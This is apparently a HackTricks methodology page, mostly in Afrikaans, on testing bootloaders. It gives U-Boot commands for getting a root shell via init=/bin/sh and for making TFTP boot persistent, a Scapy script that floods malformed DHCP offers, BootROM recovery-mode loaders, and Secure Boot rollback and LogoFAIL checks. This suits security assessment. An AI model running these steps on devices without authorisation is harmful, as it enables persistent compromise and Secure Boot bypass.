# Bootloader Testing

{{#include ../../banners/hacktricks-training.md}}

Die volgende stappe word aanbeveel vir die wysiging van toestel-opstartkonfigurasies en die toets van bootloaders soos U-Boot en UEFI-class loaders. Fokus op om vroeë kode-uitvoering te kry, die assessering van signature/rollback-beskerming, en die misbruik van recovery- of network-boot-paadjies.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot vinnige wenke en omgewingsveranderlikes-misbruik

1. Kry toegang tot die interpreter-skyfie
- Tydens opstart, druk ’n bekende breek-toets (dikwels enige sleutel, 0, spasie, of ’n board-spesifieke "magic" sekwensie) voordat `bootcmd` uitgevoer word om na die U-Boot-prompt te val.

2. Inspekteer opstarttoestand en veranderlikes
- Nuttige opdragte:
- `printenv` (dump omgewing)
- `bdinfo` (board-inligting, geheue adresse)
- `help bootm; help booti; help bootz` (ondersteunde kernel-boot-metodes)
- `help ext4load; help fatload; help tftpboot` (beskikbare loaders)

3. Wysig boot-argumente om ’n root-shell te kry
- Voeg `init=/bin/sh` by sodat die kernel na ’n shell spring in plaas van normale init:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot vanaf jou TFTP-bediener
- Konfigureer netwerk en haal ’n kernel/fit image vanaf LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Maak veranderinge volhoubaar via environment
- As env-opberging nie skryf-beskerm is nie, kan jy beheer volhoubaar maak:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Kyk vir veranderlikes soos `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` wat fallback-paadjies beïnvloed. Foutief gekonfigureerde waardes kan herhaalde breuke in die shell toelaat.

6. Kontroleer debug/on'selmbo features
- Kyk vir: `bootdelay` > 0, `autoboot` gedeaktiveer, onbeperkte `usb start; fatload usb 0:1 ...`, vermoë om `loady`/`loads` via serial, `env import` vanaf onbetroubare media, en kernels/ramdisks wat sonder signature-checks gelaai word.

7. U-Boot image/verification toetsing
- As die platform beweer dit het secure/verified boot met FIT images, probeer beide unsigned en gemaanipuleerde images:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Afwesigheid van `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` of die legacy `verify=n`-gedrag laat dikwels toe om arbitrêre payloads te boot.

## Network-boot oppervlak (DHCP/PXE) en rogue servers

8. PXE/DHCP parameter fuzzing
- U-Boot se legacy BOOTP/DHCP hantering het memory-safety kwessies gehad. Byvoorbeeld, CVE‑2024‑42040 beskryf memory disclosure via vervaardigde DHCP-antwoorde wat bytes van U-Boot-geheue terug op die draad kan leak. Oefen die DHCP/PXE kodepaaie met oorlang/edge-case waardes (option 67 bootfile-name, vendor options, file/servername velde) en let op vir hangings/leaks.
- Minimale Scapy-snippet om boot-parameters tydens netboot te stres:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Valideer ook of PXE-naamvelde deurgegee word aan shell/loader-logika sonder sanitization wanneer dit gekaak word aan OS-side provisioning skripte.

9. Rogue DHCP server command injection toetsing
- Stel ’n rogue DHCP/PXE diens op en probeer om karakters te injecteer in filename- of options-velde om bereik te kry na command-interpreters in later stadiums van die boot-ketting. Metasploit’s DHCP auxiliary, `dnsmasq`, of custom Scapy-skripte werk goed. Verseker dat jy eers die lab-netwerk isoleer.

## SoC ROM recovery modes wat normale opstart oorskryf

Baie SoCs bied ’n BootROM "loader" modus wat kode oor USB/UART sal aanvaar selfs wanneer flash images ongeldig is. As secure-boot fuses nie gebrand is nie, kan dit baie vroeë in die ketting arbitrêre kode-uitvoering verskaf.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

Evalueer of die toestel secure-boot eFuses/OTP gebrand het. Indien nie, om BootROM download modes word dikwels enige hoër-vlak verifikasie (U-Boot, kernel, rootfs) omseil deur jou eerste-stadium payload direk uit SRAM/DRAM uit te voer.

## UEFI/PC-class bootloaders: vinnige kontroles

10. ESP tampering en rollback toetsing
- Mount die EFI System Partition (ESP) en kyk vir loader-komponente: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths.
- Probeer boot met verlaagde of bekende kwesbare signed boot-komponente as Secure Boot revocations (dbx) nie aktueel is nie. As die platform nog steeds ou shims/bootmanagers vertrou, kan jy dikwels jou eie kernel of `grub.cfg` vanaf die ESP laai om persistence te kry.

11. Boot logo parsing bugs (LogoFAIL klas)
- Verskeie OEM/IBV firmwares was kwesbaar vir image-parsing foute in DXE wat boot-logo’s verwerk. As ’n aanvaller ’n vervaardigde beeld op die ESP onder ’n vendor-spesifieke pad kan plaas (bv. `\EFI\<vendor>\logo\*.bmp`) en die stelsel herbegin, kan kode-uitvoering tydens vroeë opstart moontlik wees selfs met Secure Boot ingeskakel. Toets of die platform gebruikers-gesubmite logos aanvaar en of daardie paaie vanuit die OS skryfbaar is.

## Hardware waarskuwing

Wees versigtig wanneer jy met SPI/NAND flash skakels tydens vroeë opstart (bv. aarding van penne om reads te omseil) en raadpleeg altyd die flash datasheet. Verkeerd getimede shorts kan die toestel of die programmer korrup maak.

## Notas en addisionele wenke

- Probeer `env export -t ${loadaddr}` en `env import -t ${loadaddr}` om environment-blobs tussen RAM en berging te skuif; sommige platforms laat toe om env vanaf verwyderbare media te importeer sonder authentikasie.
- Vir volhoubaarheid op Linux-gebaseerde stelsels wat via `extlinux.conf` opstart, is die wysiging van die `APPEND`-lyn (om `init=/bin/sh` of `rd.break` in te spuit) op die boot-partisie dikwels genoeg wanneer geen signature checks toegepas word nie.
- As userland `fw_printenv/fw_setenv` voorsien, verifieer dat `/etc/fw_env.config` ooreenstem met die werklike env-opberging. Foutief gekonfigureerde offsets laat jou toe om die verkeerde MTD-streek te lees/skryf.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
